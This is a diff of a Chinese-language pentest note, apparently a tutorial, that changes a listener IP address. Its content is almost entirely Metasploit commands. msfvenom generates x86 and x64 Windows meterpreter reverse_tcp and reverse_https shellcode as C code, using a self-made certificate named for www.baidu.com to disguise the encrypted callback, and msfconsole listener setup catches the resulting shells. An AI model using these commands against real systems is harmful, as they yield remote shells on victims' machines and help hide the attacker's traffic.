@@ -10,16 +10,16 @@
 ```C
 # 生成代码
 [root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp \
--b '\x00\x0b' lhost=192.168.140.128 lport=9999 -f c
+-b '\x00\x0b' lhost=192.168.93.128 lport=9999 -f c
 
 [root@localhost ~]# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp \
--b '\x00\x0b' lhost=192.168.140.128 lport=9999 -f c
+-b '\x00\x0b' lhost=192.168.93.128 lport=9999 -f c
 
 # 建立侦听器
 [root@localhost ~]# msfconsole
 msf6 exploit(handler) > use exploit/multi/handler
 msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(handler) > set lhost 192.168.140.128
+msf6 exploit(handler) > set lhost 192.168.93.128
 msf6 exploit(handler) > set lport 9999
 msf6 exploit(handler) > set EXITFUNC thread
 msf6 exploit(handler) > exploit -j -z
@@ -36,7 +36,7 @@ msf6 exploit(handler) > exploit -j -z
 
 [root@localhost ~]# cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem
 [root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https \
-> lhost=192.168.140.128 lport=8443 PayloadUUIDTracking=true PayloadUUIDName=MyShell \
+> lhost=192.168.93.128 lport=8443 PayloadUUIDTracking=true PayloadUUIDName=MyShell \
 > HandlerSSLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true \
 > -f c -o /root/shell.c
 
@@ -44,10 +44,14 @@ msf6 exploit(handler) > exploit -j -z
 [root@localhost ~]# msfconsole
 msf6 exploit(handler) > use exploit/multi/handler
 msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
-msf6 exploit(handler) > set LHOST 192.168.140.128
+msf6 exploit(handler) > set LHOST 192.168.93.128
 msf6 exploit(handler) > set LPORT 8443
 msf6 exploit(handler) > set HandlerSSLCert /root/www.baidu.com.pem
 msf6 exploit(handler) > set StagerVerifySSLCert true
 msf6 exploit(handler) > exploit -j -z
 ```
+
+
+
+
 
